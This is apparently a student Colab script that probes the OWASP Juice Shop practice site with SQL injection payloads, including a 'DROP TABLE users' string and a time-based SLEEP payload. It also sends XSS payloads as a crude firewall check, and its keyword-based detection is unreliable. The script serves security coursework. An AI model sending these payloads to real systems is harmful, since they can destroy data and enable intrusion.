# -*- coding: utf-8 -*-
"""group assignment .ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1LoM8-Gn4fo_XQfW4zYHRVD4GKlyrQXve
"""



import requests
import time

# Set the target URL
url = "https://juice-shop.herokuapp.com/#/"

# Define payloads for SQL Injection tests and WAF detection
sql_injection_payloads = [
    "' OR 1=1 --",  # Simple SQL Injection
    "' OR 'a'='a",  # Another SQL Injection
    "'; DROP TABLE users; --",  # Dangerous SQL Injection (for testing purposes)
]

time_based_sql_injection_payloads = [
    "' OR SLEEP(5) --",  # Time-based SQL Injection
]

waf_detection_payloads = [
    "<script>alert('XSS')</script>",  # Checking if WAF detects XSS
    "<img src='invalid' onerror='alert(1)'>",  # Another WAF test
]

# Function to check for connection errors or blocked requests
def check_connection():
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("Connected successfully to the website!")
        else:
            print(f"Connection error, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request blocked or connection error: {e}")

# Function to detect WAF by sending known payloads and checking for response
def check_waf():
    for payload in waf_detection_payloads:
        try:
            response = requests.get(url, params={"q": payload})
            if response.status_code == 403 or "blocked" in response.text.lower():
                print("Possible Web Application Firewall (WAF) detected!")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error in WAF detection: {e}")
            return
    print("No Web Application Firewall detected.")

# Function to detect SQL Injection (simple)
def check_sql_injection(payloads):
    for payload in payloads:
        try:
            response = requests.get(url, params={"q": payload})
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"SQL Injection detected with payload: {payload}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error during SQL Injection check: {e}")
            return
    print("No SQL Injection vulnerability detected.")

# Function to detect time-based SQL Injection
def check_time_based_sql_injection(payloads):
    for payload in payloads:
        start_time = time.time()
        try:
            response = requests.get(url, params={"q": payload})
            elapsed_time = time.time() - start_time
            if elapsed_time > 5:
                print(f"Possible Time-based SQL Injection detected with payload: {payload}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error during time-based SQL Injection check: {e}")
            return
    print("No Time-based SQL Injection vulnerability detected.")

# Main function to run the checks
def main():
    print("Starting vulnerability checks...\n")

    # Check for connection errors
    check_connection()

    # Check for WAF
    check_waf()

    # Check for SQL Injection
    check_sql_injection(sql_injection_payloads)

    # Check for Time-based SQL Injection
    check_time_based_sql_injection(time_based_sql_injection_payloads)

# Run the script
if __name__ == "__main__":
    main()